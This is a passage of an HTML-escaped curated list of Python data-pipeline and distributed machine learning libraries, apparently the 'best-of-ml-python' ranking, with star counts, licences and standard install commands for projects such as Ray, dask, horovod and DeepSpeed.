(📥 13K / month · 📦 9 · ⏱️ 06.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pypeln&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pypeln&#34;&gt;Conda&lt;/a&gt; (📥 6.5K · ⏱️ 06.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pypeln&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pdpipe/pdpipe&#34;&gt;pdpipe&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 670) - Easy pipelines for pandas DataFrames. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pdpipe/pdpipe&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 34 · 📦 40 · 📋 45 - 28% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pdpipe/pdpipe&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pdpipe&#34;&gt;PyPi&lt;/a&gt; (📥 1.8K / month · 📦 5 · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pdpipe&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pdpipe&#34;&gt;Conda&lt;/a&gt; (📥 4.3K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pdpipe&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/databricks/spark-deep-learning&#34;&gt;spark-deep-learning&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 1.9K) - Deep Learning Pipelines for Apache Spark. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/databricks/spark-deep-learning&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 460 · 📦 21 · 📋 100 - 74% open · ⏱️ 21.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/databricks/spark-deep-learning&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/nerevu/riko&#34;&gt;riko&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 1.6K) - A Python stream processing engine modeled after Yahoo! Pipes. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/nerevu/riko&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 75 · 📋 30 - 73% open · ⏱️ 28.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/nerevu/riko&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/riko&#34;&gt;PyPi&lt;/a&gt; (📥 140 / month · 📦 1 · ⏱️ 28.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install riko&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/d6t/d6tflow&#34;&gt;Databolt Flow&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 940 · 💤) - Python library for building highly effective data science.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/d6t/d6tflow&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 70 · 📦 20 · 📋 23 - 43% open · ⏱️ 28.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/d6t/d6tflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/d6tflow&#34;&gt;PyPi&lt;/a&gt; (📥 360 / month · ⏱️ 06.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install d6tflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mara/mara-pipelines&#34;&gt;Mara Pipelines&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 1.9K) - A lightweight opinionated ETL framework, halfway between plain.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mara/mara-pipelines&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 89 · 📦 9 · 📋 27 - 48% open · ⏱️ 30.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mara/mara-pipelines&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mara-pipelines&#34;&gt;PyPi&lt;/a&gt; (📥 270 / month · ⏱️ 23.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mara-pipelines&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kubeflow-kale/kale&#34;&gt;kale&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 530 · 💤) - Kubeflows superfood for Data Scientists. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/kubeflow-kale/kale&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 110 · 📋 160 - 52% open · ⏱️ 20.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/kubeflow-kale/kale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/kubeflow-kale&#34;&gt;PyPi&lt;/a&gt; (📥 990 / month · ⏱️ 19.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install kubeflow-kale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 12 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Yelp/mrjob&#34;&gt;mrjob&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.6K · 💀) - Run MapReduce jobs on Hadoop or Amazon Web Services. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/robinhood/faust&#34;&gt;faust&lt;/a&gt;&lt;/b&gt; (🥉30 · ⭐ 6.2K · 💀) - Python Stream Processing. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/databand-ai/dbnd&#34;&gt;dbnd&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 220) - DBND is an agile pipeline framework that helps data engineering teams.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/python-bonobo/bonobo&#34;&gt;bonobo&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.5K · 💀) - Extract Transform Load for Python 3.5+. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/douban/dpark&#34;&gt;dpark&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 2.7K · 💀) - Python clone of Spark, a MapReduce alike framework in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/svenkreiss/pysparkling&#34;&gt;pysparkling&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 250 · 💀) - A pure Python implementation of Apache Sparks RDD and DStream.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pricingassistant/mrq&#34;&gt;mrq&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 870 · 💀) - Mr. Queue - A distributed worker task queue in Python using Redis &amp;amp; gevent. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bodywork-ml/bodywork-core&#34;&gt;bodywork-core&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 340) - ML pipeline orchestration and model deployments on.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/analysiscenter/batchflow&#34;&gt;BatchFlow&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 180) - BatchFlow helps you conveniently work with random or sequential.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/olirice/flupy&#34;&gt;flupy&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 170) - Fluent data pipelines for python and your shell. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kkyon/botflow&#34;&gt;Botflow&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 1.2K · 💀) - Python Fast Dataflow programming framework for Data pipeline work(.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/vincentclaes/datajob&#34;&gt;datajob&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 91) - Build and deploy a serverless data pipeline on AWS with no effort. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Distributed Machine Learning&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries that provide capabilities to distribute and parallelize machine learning tasks across large-scale compute infrastructure.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ray-project/ray&#34;&gt;Ray&lt;/a&gt;&lt;/b&gt; (🥇43 · ⭐ 21K) - An open source framework that provides a simple, universal API for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ray-project/ray&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 690 · 🔀 3.6K · 📦 4.9K · 📋 10K - 22% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ray-project/ray&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ray&#34;&gt;PyPi&lt;/a&gt; (📥 1.2M / month · 📦 270 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ray&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ray-tune&#34;&gt;Conda&lt;/a&gt; (📥 30K · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ray-tune&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dask/dask&#34;&gt;dask&lt;/a&gt;&lt;/b&gt; (🥇43 · ⭐ 9.9K) - Parallel computing with task scheduling. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dask/dask&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 530 · 🔀 1.5K · 📦 37K · 📋 4.4K - 16% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dask/dask&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dask&#34;&gt;PyPi&lt;/a&gt; (📥 6.1M / month · 📦 2.6K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dask&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dask&#34;&gt;Conda&lt;/a&gt; (📥 5.6M · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dask&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dask/distributed&#34;&gt;dask.distributed&lt;/a&gt;&lt;/b&gt; (🥇41 · ⭐ 1.4K) - A distributed task scheduler for Dask. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/dask/distributed&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 270 · 🔀 620 · 📦 24K · 📋 2.9K - 38% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/dask/distributed&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/distributed&#34;&gt;PyPi&lt;/a&gt; (📥 5M / month · 📦 1.2K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install distributed&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/distributed&#34;&gt;Conda&lt;/a&gt; (📥 6.9M · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge distributed&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/horovod/horovod&#34;&gt;horovod&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 12K) - Distributed training framework for TensorFlow, Keras, PyTorch, and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/horovod/horovod&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 150 · 🔀 2K · 📦 590 · 📋 2K - 15% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/horovod/horovod&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/horovod&#34;&gt;PyPi&lt;/a&gt; (📥 65K / month · 📦 30 · ⏱️ 21.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install horovod&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/h2oai/h2o-3&#34;&gt;H2O-3&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 5.8K) - H2O is an Open Source, Distributed, Fast &amp;amp; Scalable Machine Learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/h2oai/h2o-3&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 220 · 🔀 1.9K · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/h2oai/h2o-3&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/h2o&#34;&gt;PyPi&lt;/a&gt; (📥 400K / month · 📦 75 · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install h2o&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/microsoft/DeepSpeed&#34;&gt;DeepSpeed&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 6.8K) - DeepSpeed is a deep learning optimization library that makes.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/microsoft/DeepSpeed&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 800 · 📦 260 · 📋 920 - 51% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/microsoft/DeepSpeed&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/deepspeed&#34;&gt;PyPi&lt;/a&gt; (📥 120K / month · 📦 10 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install deepspeed&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/deepspeed/deepspeed&#34;&gt;Docker Hub&lt;/a&gt; (📥 14K · ⭐ 3 · ⏱️ 09.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull deepspeed/deepspeed&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/intel-analytics/BigDL&#34;&gt;BigDL&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 3.9K) - Building Large-Scale AI Applications for Distributed Big Data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/intel-analytics/BigDL&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 140 · 🔀 990 · 📦 36 · 📋 1.3K - 35% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/intel-analytics/BigDL&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/bigdl&#34;&gt;PyPi&lt;/a&gt; (📥 5.8K / month · 📦 1 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install bigdl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://search.maven.org/artifact/com.intel.analytics.bigdl/bigdl-SPARK_2.4&#34;&gt;Maven&lt;/a&gt; (📦 4 · ⏱️ 20.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; &amp;lt;dependency&amp;gt;&#xA; &#x9;&amp;lt;groupId&amp;gt;com.intel.analytics.bigdl&amp;lt;/groupId&amp;gt;&#xA; &#x9;&amp;lt;artifactId&amp;gt;bigdl-SPARK_2.4&amp;lt;/artifactId&amp;gt;&#xA; &#x9;&amp;lt;version&amp;gt;[VERSION]&amp;lt;/version&amp;gt;&#xA; &amp;lt;/dependency&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ipython/ipyparallel&#34;&gt;ipyparallel&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.2K) - IPython Parallel: Interactive Parallel Computing in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ipython/ipyparallel&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 110 · 🔀 890 · 📋 330 - 16% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ipython/ipyparallel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ipyparallel&#34;&gt;PyPi&lt;/a&gt; (📥 48K / month · 📦 290 · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ipyparallel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/ipyparallel&#34;&gt;Conda&lt;/a&gt; (📥 610K · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge ipyparallel&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/fairscale&#34;&gt;FairScale&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 1.7K) - PyTorch extensions for high performance and large scale training. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/fairscale&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 61 · 🔀 180 · 📦 290 · 📋 310 - 21% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/fairscale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fairscale&#34;&gt;PyPi&lt;/a&gt; (📥 150K / month · 📦 15 · ⏱️ 09.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fairscale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/fairscale&#34;&gt;Conda&lt;/a&gt; (📥 18K · ⏱️ 22.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge fairscale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/PyTorchLightning/metrics&#34;&gt;metrics&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 860) - Machine learning metrics for distributed, scalable PyTorch.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img 